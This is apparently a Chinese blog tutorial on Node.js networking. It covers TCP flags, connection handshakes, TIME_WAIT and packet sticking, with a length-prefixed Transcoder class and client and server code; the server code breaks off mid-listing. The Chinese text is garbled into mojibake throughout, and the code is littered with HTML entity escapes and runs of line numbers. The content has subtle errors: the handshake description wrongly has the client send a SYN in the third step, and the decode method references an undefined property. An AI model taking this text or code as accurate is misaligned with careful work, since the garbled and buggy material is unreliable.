Nodejsè¿›ç¨‹é€€å‡ºä¼šç­‰å¾…å¼‚æ­¥å¤„ç†å®Œæˆï¼Œå¸¸è§çš„è¿ç»´è¿‡ç¨‹ä¸­ä¼šç¢°åˆ°éœ€è¦è¿›ç¨‹ä¼˜é›…é€€å‡ºçš„åœºæ™¯ï¼ŒNodejsè‡ªç„¶é€€å‡ºæ˜¯æœ€å¥½çš„ï¼Œprocess.exitæ˜¯æ¯”è¾ƒç²—æš´çš„ã€‚ å¸¸è§çš„å¼‚æ­¥è¯·æ±‚ï¼š httpè¯·æ±‚ï¼Œæ•°æ®åº“è¯·æ±‚ç­‰IOè¯·æ±‚æ“ä½œ net.Server.listen()æˆ–è€…http.Server.listenç­‰ç«¯å£ç›‘å¬ fs.write()ç±»åž‹çš„æ–‡ä»¶IOæ“ä½œ console.log()è¾“å‡ºæ—¥å¿— setTimeout()/setIntervalç­‰å®šæ—¶å™¨æ“ä½œ process.send()ç­‰å¼‚æ­¥è¯·æ±‚å‘é€ Netæ¨¡å— OSIä¸ƒå±‚æ¨¡åž‹ TCP/IPäº”å±‚æ¨¡åž‹ æè¿° åº”ç”¨å±‚ åº” æž„å»ºäºŽä¼ è¾“å±‚ä¹‹ä¸Šå¸¸ç”¨çš„HTTPã€FTPæ–‡ä»¶ä¼ è¾“åè®®ã€SMTPé‚®ä»¶ä¼ è¾“åè®®ç­‰ è¡¨ç¤ºå±‚ ç”¨ æž„å»ºäºŽä¼ è¾“å±‚ä¹‹ä¸Šå¸¸ç”¨çš„HTTPã€FTPæ–‡ä»¶ä¼ è¾“åè®®ã€SMTPé‚®ä»¶ä¼ è¾“åè®®ç­‰ ä¼šè¯å±‚ å±‚ æž„å»ºäºŽä¼ è¾“å±‚ä¹‹ä¸Šå¸¸ç”¨çš„HTTPã€FTPæ–‡ä»¶ä¼ è¾“åè®®ã€SMTPé‚®ä»¶ä¼ è¾“åè®®ç­‰ ä¼ è¾“å±‚ ä¼ è¾“å±‚ å‘ç”¨æˆ·æä¾›å¯é çš„ç«¯åˆ°ç«¯æœåŠ¡TCPã€UDP ç½‘ç»œå±‚ ç½‘ç»œå±‚ IPV4ã€IPV6 æ•°æ®é“¾è·¯å±‚ æ•°æ®é“¾è·¯å±‚ è®¾å¤‡é©±åŠ¨å’Œç¡¬ä»¶ ç‰©ç†å±‚ ç‰©ç†å±‚ è®¾å¤‡é©±åŠ¨å’Œç¡¬ä»¶ ä»€ä¹ˆæ˜¯TCPåè®®ï¼Œä»€ä¹ˆæ—¶å€™ä¼šé€‰æ‹©TCPåè®®IPåè®®æ˜¯æ— è¿žæŽ¥é€šä¿¡åè®®ï¼ŒIPåè®®ä¸ä¼šå ç”¨ä¸¤ä¸ªè®¾å¤‡ä¹‹é—´é€šä¿¡çš„çº¿è·¯ï¼ŒIPå®žé™…ä¸Šä¸»è¦è´Ÿè´£å°†æ¯ä¸ªæ•°æ®åŒ…è·¯ç”±è‡³ç›®çš„åœ°ï¼Œä½†æ˜¯IPåè®®æ²¡æœ‰èƒ½ç¡®ä¿æ•°æ®åŒ…æ˜¯å¦åˆ°è¾¾ï¼Œä¼ è¿‡åŽ»çš„æ•°æ®æ˜¯å¦æŒ‰ç…§é¡ºåºæŽ’åˆ—ï¼Œæ‰€ä»¥IPæ•°æ®åŒ…æ˜¯ä¸å¯é çš„ã€‚è€Œè§£å†³æ•°æ®ä¸å¯é çš„é—®é¢˜å°±æ˜¯ç”±TCPåè®®æ¥å®Œæˆã€‚ TCPï¼ˆTransmission Control Protocolï¼‰æ˜¯å¯é çš„ä¼ è¾“æŽ§åˆ¶åè®®ï¼Œä¸‰ä¸ªç‰¹ç‚¹ï¼š é¢å‘é“¾æŽ¥ï¼šéœ€è¦å¯¹æ–¹ä¸»æœºåœ¨çº¿ï¼Œå¹¶å»ºç«‹é“¾æŽ¥ é¢å‘å­—èŠ‚æµï¼šå‘é€å¤šå°‘å­—èŠ‚è‡ªå·±è¯´äº†ç®—ï¼Œæ¯æ¬¡é€‰å‡ºä¸€æ®µå­—èŠ‚å‘é€çš„æ—¶å€™ï¼Œéƒ½ä¼šå¸¦ä¸Šä¸€ä¸ªåºå·ï¼Œè¿™ä¸ªåºå·å°±æ˜¯å‘é€çš„è¿™æ®µå­—èŠ‚ä¸­ç¼–å·æœ€å°çš„å­—èŠ‚çš„ç¼–å·ã€‚ å¯é ï¼šä¿è¯æ•°æ®æœ‰åºçš„åˆ°è¾¾å¯¹æ–¹ä¸»æœºï¼Œæ¯å‘é€ä¸€ä¸ªæ•°æ®å°±ä¼šæœŸå¾…æ”¶åˆ°å¯¹æ–¹çš„å›žå¤ï¼Œåœ¨æŒ‡å®šæ—¶é—´å†…æ”¶åˆ°äº†ACKå›žå¤ï¼Œå°±ç¡®è®¤æ•°æ®åˆ°è¾¾ï¼Œå¦‚æžœè¶…è¿‡ä¸€å®šçš„æ—¶é—´æ²¡æœ‰æ”¶åˆ°å¯¹æ–¹çš„å›žå¤ï¼Œå°±è®¤ä¸ºå¯¹æ–¹æ²¡æœ‰æ”¶åˆ°ï¼Œå†é‡æ–°å‘é€ä¸€æ¬¡ã€‚ TCPæŠ¥æ–‡ æºç«¯å£ï¼ˆ16ï¼‰ ç›®çš„ç«¯å£ï¼ˆ16ï¼‰ TCPåºå·ï¼ˆ32ï¼‰ TCPåºå·ï¼ˆ32ï¼‰ æŽå¸¦çš„ç¡®è®¤ï¼ˆ32ï¼‰ æŽå¸¦çš„ç¡®è®¤ï¼ˆ32ï¼‰ é¦–éƒ¨é•¿åº¦ï¼ˆ4ï¼‰ä¿ç•™ï¼ˆ6ï¼‰Flagï¼ˆ6ï¼šURGã€ACKã€PSHã€RSTã€SYNã€FINï¼‰ çª—å£å°ºå¯¸ï¼ˆ16ï¼‰ TCPæ ¡éªŒå’Œï¼ˆ16ï¼‰ ç´§æ€¥æŒ‡é’ˆï¼ˆ16ï¼‰ æ•°æ®åŒ…å†…å®¹ æ•°æ®åŒ…å†…å®¹ 6ä¸ªæ ‡å¿—ä½ï¼š URG,ç´§æ€¥æŒ‡é’ˆæ ‡å¿—ï¼Œå½“ä¸º1æ—¶è¡¨ç¤ºç´§æ€¥æŒ‡é’ˆæœ‰æ•ˆï¼Œä¸º0æ—¶åˆ™å¿½ç•¥ç´§æ€¥æŒ‡é’ˆ ACK,ç¡®è®¤åºå·æ ‡å¿—ï¼Œä¸º1è¡¨ç¤ºç¡®è®¤æœ‰æ•ˆï¼Œä¸º0è¡¨ç¤ºæŠ¥æ–‡ä¸å«æœ‰ç¡®è®¤ä¿¡æ¯ï¼Œç¡®è®¤å·æ— è¯¯ PSH,pushæ ‡å¿—ï¼Œå½“ä¸º1æ—¶å°±æ˜¯è®©æŽ¥æ”¶æ–¹æ”¶åˆ°è¯¥TCPæŠ¥æ–‡çš„æ—¶å€™ä¸è¿›å…¥ç¼“å†²åŒºæŽ’é˜Ÿè€Œæ˜¯å¿«é€Ÿå‘é€ç»™åº”ç”¨ç¨‹åº RST,é‡ç½®è¿žæŽ¥æ ‡å¿—ï¼Œå½“è¿žæŽ¥å‡ºçŽ°é”™è¯¯çš„æ—¶å¯ä»¥é‡ç½®ï¼Œæˆ–è€…ç”¨äºŽæ‹’ç»éžæ³•çš„æŠ¥æ–‡æ®µå’Œè¿žæŽ¥è¯·æ±‚ SYN,åŒæ­¥åºå·ï¼Œç”¨äºŽå»ºç«‹è¿žæŽ¥è¿‡ç¨‹ FIN,finishæ ‡å¿—ï¼Œç”¨äºŽé‡Šæ”¾è¿žæŽ¥ 3æ¬¡æ¡æ‰‹åè®®ï¼š ç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼Œå½“å®¢æˆ·ç«¯éœ€è¦åŽ»å»ºç«‹è¿žæŽ¥æ—¶ï¼Œå®¢æˆ·ç«¯å°±ä¼šå‘é€SYNåŒ…ï¼ˆseq=xï¼‰åˆ°æœåŠ¡å™¨ï¼Œç„¶åŽå®¢æˆ·ç«¯è¿›å…¥SYN_SENDçš„çŠ¶æ€ï¼Œä»£è¡¨å·²ç»å‘SYNåŒ…è¿‡åŽ»ï¼Œå¹¶ä¸”åœ¨ç­‰å¾…æœåŠ¡å™¨ç¡®è®¤ã€‚æ­¤æ—¶ï¼ŒACK=0,SYN=1ã€‚ ç¬¬äºŒæ¬¡æ¡æ‰‹ï¼ŒæœåŠ¡å™¨æ”¶åˆ°SYNåŒ…ï¼Œä¼šè¿›è¡Œç¡®è®¤ï¼Œç”±ä¸Šé¢çš„æ ‡å¿—çŸ¥é“SYNæ˜¯è¡¨ç¤ºåŒæ­¥åºå·ï¼Œè¿™æ—¶å€™ä¼šä½¿å¾— ç¡®è®¤å·=åºå·+1ï¼Œå³ackç­‰äºŽx+1,ç„¶åŽæœåŠ¡å™¨ä¹Ÿä¼šåƒå®¢æˆ·ç«¯å‘é€ä¸€ä¸ªSYNåŒ…ï¼ˆseq=y),ä¹Ÿå°±æ˜¯æœåŠ¡å™¨ä¼šå‘é€SYN+ACKåŒ…ï¼Œæ¥è¡¨ç¤ºç¡®è®¤åˆ°äº†å®¢æˆ·ç«¯çš„ä¸€æ¬¡æ¡æ‰‹å¹¶ä¸”äºŒæ¬¡æ¡æ‰‹å»ºç«‹ï¼Œæ­¤æ—¶æœåŠ¡å™¨è¿›å…¥SYN_RECVçŠ¶æ€ã€‚æ­¤æ—¶ï¼ŒACK=1,SYN=1ã€‚ ç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼Œå®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨çš„SYN+ACKåŒ…ï¼Œç„¶åŽå°±ä¼šå‘æœåŠ¡å™¨å‘é€ç¡®è®¤åŒ…ACK(ack=y+1)å’ŒSYN(seq=x+1),ç­‰åˆ°è¿™ä¸ªåŒ…å‘é€å®Œæ¯•ä¹‹åŽå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨å°±ä¼šè¿›å…¥ESTABLISHEDçŠ¶æ€ï¼Œå®Œæˆä¸‰æ¬¡æ¡æ‰‹ï¼Œå°±å¯ä»¥åœ¨æœåŠ¡å™¨ä¸Žå®¢æˆ·ç«¯ä¹‹é—´ä¼ è¾“æ•°æ®äº†ã€‚ SYNæ˜¯åŒæ­¥åºå·ï¼Œå½“SYN=1è€ŒACK=0æ—¶è¡¨æ˜Žè¿™æ˜¯ä¸€ä¸ªè¿žæŽ¥è¯·æ±‚æŠ¥æ–‡ï¼Œå¯¹æ–¹è‹¥åŒæ„è¿žæŽ¥ï¼Œé‚£åº”åœ¨æŠ¥æ–‡ä¸­ä½¿SYN=1å’ŒACK=1ï¼Œå› æ­¤SYNç½®1è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªè¿žæŽ¥è¯·æ±‚æˆ–è€…è¿žæŽ¥æŽ¥å—æŠ¥æ–‡ã€‚è€ŒACKçŠ¶æ€æ˜¯ç”¨æ¥ç¡®è®¤æ˜¯å¦åŒæ„è¿žæŽ¥ã€‚ä¹Ÿå°±æ˜¯ä¼ äº†SYN,è¯æ˜Žå‘é€æ–¹åˆ°æŽ¥æ”¶æ–¹çš„é€šé“æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯æŽ¥æ”¶æ–¹åˆ°å‘é€æ–¹çš„é€šé“è¿˜éœ€è¦ACKä¿¡å·æ¥éªŒè¯ å½“åœ¨ä¼ é€å®Œæ•°æ®ä¹‹åŽï¼Œå®¢æˆ·ç«¯ä¸ŽæœåŠ¡å™¨ç«¯ä¹‹é—´æœ‰å››æ¬¡æ¡æ‰‹åè®®ï¼š ç¬¬ä¸€æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯å‘é€ä¸€ä¸ªFINå’Œåºå·è¿‡åŽ»ï¼ˆseq=uï¼‰ç”¨æ¥è¡¨ç¤ºå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯ä¹‹é—´æœ‰å…³é—­çš„è¯·æ±‚ï¼ŒåŒæ—¶å…³é—­å®¢æˆ·ç«¯çš„æ•°æ®ä¼ é€ï¼Œå®¢æˆ·ç«¯å°±è¿›å…¥FIN_WAIT_1çš„çŠ¶æ€ ç¬¬äºŒæ¬¡æ¡æ‰‹ï¼šæœåŠ¡ç«¯æ”¶åˆ°FIN=1çš„æ ‡å¿—ä½ï¼Œå°±ä¼šå‘é€ä¸€ä¸ªACKæ ‡å¿—ä½è¡¨ç¤ºç¡®è®¤ï¼Œç„¶åŽç¡®è®¤åºå·å°±å˜æˆäº†æ”¶åˆ°çš„åºå·+1,å³ack=u+1(FINå’ŒSYNåœ¨è¿™ç‚¹ç›¸åŒï¼Œä½†æ˜¯ä½œç”¨ä¸ä¸€æ ·)è¿™æ—¶å€™æœåŠ¡ç«¯è¿›å…¥CLOSE_WAITçŠ¶æ€ï¼Œè¿™æ˜¯ä¸€ä¸ªåŠå…³é—­çŠ¶æ€ã€‚åªèƒ½æœåŠ¡ç«¯ç»™å®¢æˆ·ç«¯å‘é€æ•°æ®è€Œå®¢æˆ·ç«¯ä¸èƒ½ç»™æœåŠ¡ç«¯å‘é€æ•°æ® ç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼šè¿™æ¬¡æ¡æ‰‹è¿˜æ˜¯æœåŠ¡ç«¯å‘èµ·çš„ã€‚è¿™æ˜¯æœåŠ¡ç«¯åœ¨ä¼ å®Œæœ€åŽçš„æ•°æ®ï¼ˆæ²¡æœ‰å°±ä¸ä¼ ï¼‰å°±ä¼šå‘é€ä¸€ä¸ªFIN=1å’ŒACK=1,ä¸”åºå·seqä¼šæ”¹å˜ï¼ˆæ²¡æœ‰ä¼ æ•°æ®åˆ™ä¸å˜ï¼‰ï¼Œè€Œackä¸å˜ï¼Œè¿™æ—¶å€™æœåŠ¡ç«¯å°±ä¼šè¿›å…¥LAST_ACKçŠ¶æ€ï¼Œè¡¨ç¤ºæœ€åŽå†ç¡®è®¤ä¸€æ¬¡ã€‚ ç¬¬å››æ¬¡æ¡æ‰‹ï¼šå®¢æˆ·ç«¯åœ¨æŽ¥æ”¶åˆ°FINä¹‹åŽï¼Œå°±ä¼šè¿›å…¥TIME_WAITçŠ¶æ€ï¼ŒæŽ¥ç€å‘é€ä¸€ä¸ªACKå’Œseq=u+1,ack=w+1ç»™æœåŠ¡ç«¯ï¼Œè¿™æ—¶å€™æœåŠ¡ç«¯å°±ä¼šè¿›å…¥CLOSEDçŠ¶æ€ã€‚è€Œå®¢æˆ·ç«¯è¿›å…¥TIME_WAITçŠ¶æ€çš„æ—¶å€™å¿…é¡»è¦ç­‰å¾…2MSLçš„æ—¶é—´æ‰ä¼šå…³é—­ TIME_WAITçŠ¶æ€çš„ä½œç”¨ï¼Ÿï¼ˆMSLï¼šç½‘ç»œä¸­æ•°æ®æŠ¥æ–‡å­˜åœ¨çš„æœ€å¤§æ—¶é—´ï¼‰ TIME_WAITçŠ¶æ€å¯ä»¥ç¡®ä¿æœ‰è¶³å¤Ÿçš„æ—¶é—´è®©å¯¹æ–¹æŽ¥æ”¶åˆ°ACKåŒ…ï¼Œå¦‚æžœACKæ²¡æœ‰åˆ°è¾¾ï¼Œåœ¨ä¼ è¾“è¿‡ç¨‹ä¸¢å¤±äº†æˆ–è€…ä¸€äº›å…¶ä»–åŽŸå› ï¼Œè¿™æ ·å°±å¯ä»¥è®©å®¢æˆ·ç«¯é‡å‘ACKåŒ…ï¼Œå¦‚æžœå®¢æˆ·ç«¯ç›´æŽ¥å…³é—­äº†ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½å¯¼è‡´æœåŠ¡ç«¯åœ¨ä¸€äº›æƒ…å†µä¸‹æ²¡æœ‰æŽ¥å—åˆ°ACKåŒ…è€Œæ— æ³•ä¸Žå®¢æˆ·ç«¯æ–­å¼€è¿žæŽ¥ã€‚è¿™æ ·å®¢æˆ·ç«¯å‘é€ACKåŒ…åˆ°æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯è¯·æ±‚é‡å‘ï¼Œä¸€æ¥ä¸€å›žå°±åˆšå¥½æ˜¯2MSL ä¿è¯è¿Ÿæ¥çš„TCPæŠ¥æ–‡æ®µæœ‰è¶³å¤Ÿçš„æ—¶é—´è¢«è¯†åˆ«å¹¶ä¸¢å¼ƒï¼Œlinuxä¸­ä¸€ä¸ªTCPortä¸èƒ½æ‰“å¼€ä¸¤æ¬¡æˆ–è€…ä¸¤æ¬¡ä»¥ä¸Šã€‚å½“clientå¤„äºŽtime_waitçŠ¶æ€æ—¶æ— æ³•ä½¿ç”¨æ­¤portå»ºç«‹æ–°è¿žæŽ¥ï¼Œå‡è®¾ä¸å­˜åœ¨time_waitçŠ¶æ€ï¼Œæ–°è¿žæŽ¥å¯èƒ½ä¼šå—åˆ°æ—§è¿žæŽ¥çš„æ•°æ® TCPç²˜åŒ…æ˜¯ä»€ä¹ˆ,è¯¥æ€Žä¹ˆåŠžå®¢æˆ·ç«¯ï¼ˆå‘é€ä¸€ç«¯ï¼‰åœ¨å‘é€ä¹‹å‰ä¼šå°†çŸ­æ—¶é—´æœ‰å¤šä¸ªå‘é€çš„æ•°æ®å—ç¼“å†²åˆ°ä¸€èµ·ï¼ˆå‘é€ç¼“å†²åŒºï¼‰ï¼Œå½¢æˆäº†ä¸€ä¸ªå¤§çš„æ•°æ®å—ä¸€å¹¶å‘é€ï¼ŒåŒæ ·æŽ¥æ”¶ç«¯ä¹Ÿæœ‰ä¸€ä¸ªæŽ¥æ”¶ç¼“å†²åŒºï¼Œæ”¶åˆ°çš„æ•°æ®å…ˆå­˜æ”¾åœ¨æŽ¥æ”¶ç«¯ç¼“å†²åŒºï¼Œç„¶åŽç¨‹åºä»Žè¿™é‡Œè¯»å–éƒ¨åˆ†æ•°æ®è¿›è¡Œæ¶ˆè´¹ï¼Œè¿™æ ·åšä¹Ÿæ˜¯ä¸ºäº†å‡å°‘I/Oæ¶ˆè€—è¾¾åˆ°æ€§èƒ½ä¼˜åŒ–ã€‚ æ•°æ®è¾¾åˆ°ç¼“å†²åŒºä»€ä¹ˆæ—¶é—´å¼€å‘å‘é€è¿™ä¸ªå–å†³äºŽTCPæ‹¥å¡žæŽ§åˆ¶ï¼Œæ˜¯ä»»ä½•æ—¶åˆ»å†…ç¡®å®šèƒ½è¢«å‘é€å‡ºåŽ»çš„å­—èŠ‚æ•°çš„æŽ§åˆ¶å› ç´ ä¹‹ä¸€ï¼Œæ˜¯é˜»æ­¢å‘é€æ–¹è‡³æŽ¥æ”¶æ–¹ä¹‹é—´çš„é“¾è·¯å˜å¾—æ‹¥å¡žçš„æ‰‹æ®µ TCPç²˜åŒ…è§£å†³æ–¹æ¡ˆï¼š å»¶è¿Ÿå‘é€ï¼šè®¾ç½®å»¶è¿Ÿå‘é€ï¼Œsleepä¼‘çœ ä¸€æ®µæ—¶é—´ã€‚ç®€å•ä½†æ˜¯ä¼ è¾“æ•ˆçŽ‡å¤§å¤§é™ä½Žï¼Œåªé€‚ç”¨äºŽäº¤äº’é¢‘çŽ‡ä½Žçš„æƒ…å†µ å…³é—­nagleç®—æ³•ã€‚nagleç®—æ³•æ˜¯ä¸€ç§æ”¹å–„ç½‘ç»œä¼ è¾“æ•ˆçŽ‡çš„ç®—æ³•ï¼Œé¿å…ç½‘ç»œä¸­å……æ–¥ç€å¤§é‡å°çš„æ•°æ®å—ï¼Œå®ƒæ‰€æœŸæœ›çš„æ˜¯å°½å¯èƒ½å‘é€å¤§çš„æ•°æ®å—ï¼Œå› æ­¤åœ¨æ¯æ¬¡è¯·æ±‚ä¸€ä¸ªæ•°æ®å—ç»™TCPå‘é€æ—¶ï¼ŒTCPå¹¶ä¸ä¼šç«‹å³æ‰§è¡Œå‘é€ï¼Œè€Œæ˜¯ç­‰å¾…ä¸€å°æ®µæ—¶é—´è¿›è¡Œå‘é€ã€‚ å½“ç½‘ç»œä¸­å……æ–¥ç€å¤§é‡å°çš„æ•°æ®å—æ—¶ï¼ŒNagleç®—æ³•èƒ½å°†å°çš„æ•°æ®å—é›†åˆèµ·æ¥ä¸€èµ·å‘é€å‡å°‘äº†ç½‘ç»œæ‹¥å µï¼Œä½†å¹¶ä¸æ˜¯æ‰€æœ‰åœºæ™¯éƒ½éœ€è¦è¿™æ ·ã€‚ä¾‹å¦‚ï¼ŒREPLç»ˆç«¯äº¤äº’ï¼Œå½“ç”¨æˆ·è¾“å…¥å•ä¸ªå­—ç¬¦ä»¥èŽ·å–å“åº”ï¼Œæ‰€ä»¥åœ¨nodejsä¸­å¯ä»¥è®¾ç½® socket.setNoDelayæ–¹æ³•æ¥å…³é—­Nagleç®—æ³•ã€‚const server = net.createServer(); server.on(&#39;connection&#39;,socket=&gt;{socket.setNoDelay(true)}) å°åŒ…/æ‹†åŒ…ã€‚ä½¿ç”¨é•¿åº¦ç¼–ç çš„æ–¹å¼ï¼Œé€šä¿¡åŒæ–¹çº¦å®šå¥½æ ¼å¼ï¼Œå°†æ¶ˆæ¯åˆ†ä¸ºå®šé•¿çš„æ¶ˆæ¯å¤´ï¼ˆHeaderï¼‰å’Œä¸å®šé•¿çš„æ¶ˆæ¯ä½“ï¼ˆBodyï¼‰ï¼Œåœ¨è§£æžæ—¶è¯»å–æ¶ˆæ¯å¤´èŽ·å–åˆ°å†…å®¹çš„å ç”¨çš„é•¿åº¦ï¼Œä¹‹åŽè¯»å–åˆ°çš„æ¶ˆæ¯ä½“å†…å®¹å­—èŠ‚æ•°ç­‰äºŽå­—èŠ‚å¤´çš„å­—èŠ‚æ•°æ—¶ï¼Œè®¤ä¸ºå®ƒæ˜¯ä¸€ä¸ªå®Œæ•´çš„åŒ…ã€‚ æ¶ˆæ¯å¤´åºå·ï¼ˆHeaderï¼‰ æ¶ˆæ¯ä½“é•¿åº¦ï¼ˆHeaderï¼‰ æ¶ˆæ¯ä½“ï¼ˆBodyï¼‰ SerialNumber bodyLength body 2å­—èŠ‚ 2å­—èŠ‚ Nå­—èŠ‚ Bufferçš„å‡ ä¸ªapiï¼š Buffer.alloc(size[,fill[,encoding]]),åˆå§‹åŒ–ä¸€ä¸ªsizeå¤§å°çš„Bufferç©ºé—´ï¼Œé»˜è®¤å¡«å……0ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šfillè¿›è¡Œè‡ªåŠ¨ä»¥å¡«å…… Buffer.writeInt16BE(value[,offset]),valueä¸ºè¦å†™å…¥çš„Bufferå€¼ï¼Œoffsetä¸ºåç§»é‡ä»Žå“ªä¸ªä½ç½®å¼€å§‹å†™å…¥ Buffer.writeInt32BE(value[,offset]),valueä¸ºè¦å†™å…¥çš„Bufferå€¼ï¼Œä¸åŒçš„æ˜¯writeInt16BEè¡¨ç¤ºé«˜ä½ä¼˜å…ˆå†™å…¥ä¸€ä¸ª16ä½æ•´åž‹ï¼Œè¿™ä¸ªæ˜¯32ä½ Buffer.readInt16BE([offset])ï¼Œé«˜ä½ä¼˜å…ˆè¯»å–16ä½æ•´åž‹ï¼Œoffsetä¸ºè¯»å–ä¹‹å‰è¦è·³è¿‡çš„å­—èŠ‚æ•° Buffer.readInt32BE([offset])ï¼Œé«˜ä½ä¼˜å…ˆè¯»å–32ä½æ•´åž‹ï¼Œoffsetä¸ºè¯»å–ä¹‹å‰è¦è·³è¿‡çš„å­—èŠ‚æ•° ç¼–ç /è§£ç çš„å®žçŽ°TCPé¡¶å±‚æ˜¯åŸºäºŽäºŒè¿›åˆ¶æ•°æ®ï¼Œåº”ç”¨å±‚é€šå¸¸æ˜¯æ˜“äºŽè¡¨è¾¾çš„å­—ç¬¦ä¸²ã€æ•°å­—ç­‰ï¼Œéœ€è¦å…ˆå°†æ•°æ®é€šè¿‡Bufferè½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼Œå–å‡ºçš„æ—¶å€™åŒæ ·éœ€è¦è§£ç æ“ä½œã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// transcoder.jsclass Transcoder &#123; constructor() &#123; this.packageHeaderLen = 4; // åŒ…å¤´é•¿åº¦ this.serialNumber = 0; // å®šä¹‰åŒ…åºå· this.packageSerialNumberLen = 2; // åŒ…åºåˆ—å·æ‰€å ç”¨çš„å­—èŠ‚ &#125; /** * ç¼–ç  * @param &#123;Object&#125; data Buffer å¯¹è±¡æ•°æ® * @param &#123;Int&#125; serialNumber åŒ…åºå·ï¼Œå®¢æˆ·ç«¯ç¼–ç æ—¶è‡ªåŠ¨ç”Ÿæˆï¼ŒæœåŠ¡å™¨è§£ç ä¹‹åŽåœ¨ç¼–ç æ—¶éœ€è¦ä¼ å…¥è§£ç çš„åŒ…åºå· */ encode(data, serialNumber) &#123; const body = Buffer.from(data); const header = Buffer.alloc(this.packageHeaderLen); header.writeInt16BE(serialNumber || this.serialNumber); header.writeInt16BE(body.length, this.packageSerialNumberLen); // è·³è¿‡åŒ…åºå·çš„å‰ä¸¤ä½ if (serialNumber === undefined) &#123; this.serialNumber++; &#125; return Buffer.concat([header, body]) &#125; /** * è§£ç  * @param &#123;Object&#125; buffer */ decode(buffer) &#123; const header = buffer.slice(0, this.packageHeader); // èŽ·å–åŒ…å¤´ const body = buffer.slice(this.packageHeaderLen); // èŽ·å–åŒ…å°¾éƒ¨ return &#123; serialNumber: header.readInt16BE(), bodyLength: header.readInt16BE(this.packageSerialNumberLen), // å› ä¸ºç¼–ç é˜¶æ®µè·³è¿‡ä¸¤ä½ï¼Œæ‰€ä»¥è§£ç ä¹Ÿéœ€è¦è·³è¿‡ body: body.toString(), &#125; &#125; /** * èŽ·å–åŒ…é•¿åº¦ä¸¤ç§æƒ…å†µ * 1. å¦‚æžœå½“å‰bufferé•¿åº¦æ•°æ®å°äºŽåŒ…å¤´ï¼Œè‚¯å®šä¸æ˜¯ä¸€ä¸ªå®Œæ•´çš„æ•°æ®åŒ…ï¼Œå› æ­¤ç›´æŽ¥è¿”å›ž0ä¸åšå¤„ç†ï¼ˆå¯èƒ½æ•°æ®è¿˜æ²¡æœ‰æŽ¥æ”¶å®Œï¼‰ * 2. å¦åˆ™è¿”å›žè¿™ä¸ªå®Œæ•´çš„æ•°æ®åŒ…é•¿åº¦ * @param &#123;*&#125; buffer */ getPackageLength(buffer) &#123; if (buffer.length &lt; this.packageHeaderLen) &#123; return 0; &#125; return this.packageHeaderLen + buffer.readInt16BE(this.packageSerialNumberLen) &#125;&#125;module.exports = Transcoder; å®¢æˆ·ç«¯ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253const net = require('net');const Transcoder = require('./transcoder');const transcoder = new Transcoder();const client = net.createConnection(&#123; host: '127.0.0.1', port: 3000&#125;)let overageBuffer = null; //ä¸Šä¸€æ¬¡Bufferå‰©ä¸‹çš„æ•°æ®client.on('data', buffer =&gt; &#123; if (overageBuffer) &#123; buffer = Buffer.concat([overageBuffer, buffer]) &#125; let packageLength = 0; // eslint-disable-next-line no-cond-assign while (packageLength = transcoder.getPackageLength(buffer)) &#123; const packageData = buffer.slice(0, packageLength); // å–å‡ºæ•´ä¸ªæ•°æ®åŒ… buffer = buffer.slice(packageLength); // åˆ é™¤å·²ç»å–å‡ºçš„æ•°æ®åŒ…ï¼Œè¿™é‡Œé‡‡ç”¨çš„æ–¹æ³•æ˜¯æŠŠç¼“å†²åŒºï¼ˆbufferï¼‰å·²å–å‡ºçš„åŒ…ç»™æˆªæŽ‰ const result = transcoder.decode(packageData); // è§£ç  console.log(result) &#125; overageBuffer = buffer; // è®°å½•å‰©ä½™ä¸å®Œæ•´çš„åŒ…&#125;).on('error', err =&gt; &#123; // ç›‘å¬ä¸€ä¸ªæœªå¼€å¯çš„ç«¯å£å°±ä¼šæŠ¥ ECONNREFUSEDé”™è¯¯ console.log(`æœåŠ¡å™¨å¼‚å¸¸: $&#123;err&#125;`)&#125;).on('close', err =&gt; &#123; console.log(`å®¢æˆ·é“¾æŽ¥æ–­å¼€ï¼ï¼Œ $&#123;err&#125;`)&#125;)client.write(transcoder.encode('Nodejs æŠ€æœ¯æ ˆ'))const arr = [ '1 JavaScript ', '2 TypeScript ', '3 Python ', '4 Java ', '5 C ', '6 PHP ', '7 ASP.NET ',];setTimeout(() =&gt; &#123; for (let i = 0; i &lt; arr.length; i++) &#123; console.log(arr[i]) client.write(transcoder.encode(arr[i])) &#125;&#125;, 1000) æœåŠ¡ç«¯ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051const net = require('net');const Transcoder = require('./transcoder');const transcoder = new Transcoder();const HOST = '127.0.0.1';const PORT = 3000;let overageBuffer = null; // ä¸Šä¸€æ¬¡å–„å‰©ä½™æ•°æ®// åˆ›å»ºä¸€ä¸ªTCPæœåŠ¡å®žä¾‹const server = net.createServer();// ç›‘å¬ç«¯å£server.listen(PORT, HOST)server.on('listening', () =&gt; &#123; console.log(`æœåŠ¡å·²ç»å¼€å¯åœ¨$&#123;HOST&#125;:$&#123;PORT&#125;`)&#125;).on('connection', socket =&gt; &#123; // dataäº‹ä»¶å°±æ˜¯è¯»å–æ•°æ® socket.on('data', buffer =&gt; &#123; if (overageBuffer) &#123; buffer = Buffer.concat([overageBuffer, buffer]) &#125; let packageLength = 0; // eslint-disable-next-line no-cond-assign while (packageLength = transcoder.getPackageLength(buffer)) &#123; const packageData = buffer.slice(0, packageLength); //å–å‡ºæ•´ä¸ªæ•°æ®åŒ… buffer = buffer.slice(packageLength); // åˆ é™¤å–å‡ºçš„æ•°æ®åŒ…ï¼Œè¿™é‡Œé‡‡ç”¨çš„æ–¹æ³•æ˜¯æŠŠç¼“å†²åŒºbufferå·²å–å‡ºçš„åŒ…æˆªæŽ‰ const result = transcoder.decode(packageData); // è§£ç  console.log(result); socket.write(transcoder.encode(result.body, result.serialNumber)) &#125; overageBuffer = buffer; // 